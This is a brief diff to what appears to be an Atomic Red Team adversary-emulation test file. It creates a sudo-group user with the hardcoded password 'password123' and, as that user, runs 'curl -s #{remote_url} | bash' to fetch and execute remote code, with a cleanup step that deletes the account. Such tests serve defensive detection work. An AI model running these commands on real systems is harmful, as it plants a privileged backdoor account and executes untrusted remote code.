@@ -185,8 +185,7 @@ atomic_tests:
     elevation_required: true
     command: |
       useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art
-      su -c "cd /tmp" art
-      su -c "curl -s #{remote_url} |bash" art
+      su -c "cd /tmp; curl -s #{remote_url} | bash" art
     cleanup_command: |
       userdel -fr art
 
